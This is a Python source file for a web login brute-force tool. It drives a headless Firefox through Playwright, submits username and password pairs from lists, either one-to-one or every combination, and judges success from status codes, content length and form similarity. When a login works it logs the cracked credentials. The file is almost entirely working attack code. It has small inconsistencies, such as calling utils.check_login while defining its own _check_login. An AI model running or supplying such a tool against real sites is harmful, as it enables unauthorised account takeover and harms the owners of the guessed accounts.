import logging
import sys
from bs4 import BeautifulSoup
from playwright.async_api import async_playwright
import utils


class headless:
    """
    This class performs the brute force attack using playwright:
    * initiates a playwright instance  with firefox web driver.
    * goes to the login page.
    * fills the input fields with each username and password based on the provided lists individually.
    * attempts to login by clicking on the login button
    * checks if the login was successful based on multiple factors such as status code, content length...
    """

    def __init__(self, url, web_parser, pass_user, parallel) -> None:
        self._url = url
        self._web_parser = web_parser
        self._pass_user = pass_user
        self._parallel = parallel

    async def brute(self) -> None:
        """
        sends all combinations for usernames and passwords to the attack function on the login page
        """
        p = await async_playwright().start()

        browser = await p.firefox.launch()
        page = await browser.new_page()
        await page.goto(self._url)

        await page.wait_for_selector(self._web_parser.button_attr)

        # attempts each username with the parallel password in the csv file
        if self._parallel:
            index = min(
                len(self._pass_user["Usernames"]), len(self._pass_user["Passwords"])
            )
            for username_index in range(0, index):
                page.once("request", self._getResponseStatus)
                await self._attack(
                    self._pass_user["Usernames"][username_index],
                    self._pass_user["Passwords"][username_index],
                    page,
                    browser,
                    p,
                )

        # attempts each username with every password in the csv file (cartesian multiplication)
        else:
            for username in self._pass_user["Usernames"]:
                for password in self._pass_user["Passwords"]:
                    page.once("request", self._getResponseStatus)
                    await self._attack(username, password, page, browser, p)

        await browser.close()
        await p.stop()

    async def _attack(self, username, password, page, browser, p):
        """
        attempts login by filling the  username and password input fields and clicking on the login button
        and await a response packet after attempting login
        """
        self.status_code = []
        await page.fill("input[name=" + self._web_parser.user_param + "]", username)
        await page.fill("input[name=" + self._web_parser.password_param + "]", password)

        await page.locator(self._web_parser.button_attr).click()

        content = await page.content()
        await page.wait_for_event("response")

        if utils.check_login(content, self.status_code, self._web_parser):
            logging.info(
                "login successful\n\nusername: " + username + "\npassword: " + password
            )
            await browser.close()
            await p.stop()
            sys.exit()

        # refresh login page
        await page.goto(self._url)
        await page.wait_for_selector(self._web_parser.button_attr)

    async def _getResponseStatus(self, req) -> None:
        """
        Get response status code each attack attempt
        """
        if req.method == "POST":
            response = await req.response()
            self.status_code = response.status

    def _check_login(self, content) -> bool:
        """
        Checks if login was successful, for example: by checking if status code changed and checks if form is still in the page
        """
        logging.info("[check_login] Status code!: " + str(self.status_code))

        if self.status_code >= 400:
            logging.info(
                "[check_login] Status code changed and its >= 400 ! : "
                + str(self.status_code)
            )
            return False

        elif self.status_code != self._web_parser.status_code:
            logging.info("[check_login] Status code changed!: " + str(self.status_code))
            return True

        elif (
            (
                abs(len(content) - self._web_parser.contentLen)
                / self._web_parser.contentLen
            )
            * 100.0
        ) >= 20:
            logging.info("[check_login] content length changed!: " + str(len(content)))
            return True
        # Checks if the login form is still in the page using html similarity
        from html_similarity import style_similarity, structural_similarity, similarity

        k = 0.3
        parser = BeautifulSoup(content, "html.parser")
        forms = parser.findAll("form")
        webParser_form = self._web_parser.form
        max_similarity = 0
        for web_form in forms:
            similarity = k * structural_similarity(
                str(webParser_form), str(web_form)
            ) + (1 - k) * style_similarity(str(webParser_form), str(web_form))
            if similarity > max_similarity:
                max_similarity = similarity
        logging.info(" max_similarity: " + str(max_similarity))
        if max_similarity < 0.8:
            logging.info("[check_login] max_similarity: " + str(max_similarity))
            return True

        return False
